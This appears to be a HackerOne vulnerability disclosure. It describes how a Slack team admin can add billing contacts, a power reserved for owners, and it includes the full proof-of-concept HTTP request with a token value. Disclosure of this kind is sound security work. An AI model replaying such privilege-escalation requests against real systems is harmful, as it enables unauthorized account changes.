# HackerOne Report: Team admin can add billing contacts
**Report ID:** 47940
**Vulnerability Class:** Privilege Escalation

## Vulnerability Information & PoC
Billing contacts can only be added by team owners. However, team admin can escalate his privileges and add billing contacts.

Steps to reproduce:
1.Log in as team admin
2.Send the below request using his token and it adds 'hacker@hacker.com' to billing contacts.

POST /api/team.billing.addContact HTTP/1.1
Host: satishb3mailinator.slack.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 106

email=hacker@hacker.com&token=xoxs-3206092076-3204538285-3743137121-836b042620&set_active=true&_attempts=1

To confirm, login as team owner and navigate to billing contacts. Notice that hacker@hacker.com is added to billing contact list.

## Discussion & Remediation Timeline
